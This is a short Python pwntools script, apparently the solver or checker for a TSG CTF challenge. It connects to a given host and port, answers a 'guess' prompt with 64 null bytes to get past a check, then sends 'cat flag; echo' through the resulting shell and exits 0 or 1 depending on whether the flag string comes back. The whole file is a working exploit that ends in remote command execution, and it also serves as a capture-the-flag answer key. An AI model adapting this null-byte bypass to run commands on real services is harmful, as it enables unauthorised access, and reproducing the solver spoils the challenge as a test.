from pwn import *
import sys
context.log_level = 'error'

host = sys.argv[1]
port = int(sys.argv[2])

r = remote(host, port)
r.recvuntil(b"guess")
import time
time.sleep(1)
r.sendline(b"\x00" * 64)
r.recvuntil(b"yes\n")
r.sendline("cat flag; echo")
s = r.recvline()
print(s.decode("ascii").strip("\n"))
if b"TSGCTF" in s:
    exit(0)
else:
    exit(1)

